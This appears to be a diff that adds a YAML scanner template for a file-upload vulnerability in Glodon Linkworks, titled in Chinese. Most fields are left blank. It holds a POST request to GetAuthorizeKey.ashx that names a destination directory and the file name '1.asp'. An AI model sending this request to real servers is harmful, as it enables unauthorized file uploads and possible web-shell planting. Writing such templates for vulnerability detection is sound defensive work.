@@ -1,0 +1,19 @@
+id:
+info:
+  name: 广联达Linkworks GetAuthorizeKey.ashx 文件上传漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /Services/FileService/UserFiles/GetAuthorizeKey.ashx
+  headers:
+  data: |
+    cmd=&destDir=./sysinfo/&destFilename=1.asp
+response1:
+  headers:
+  body: key
+  code:
+requests2:
+response2:
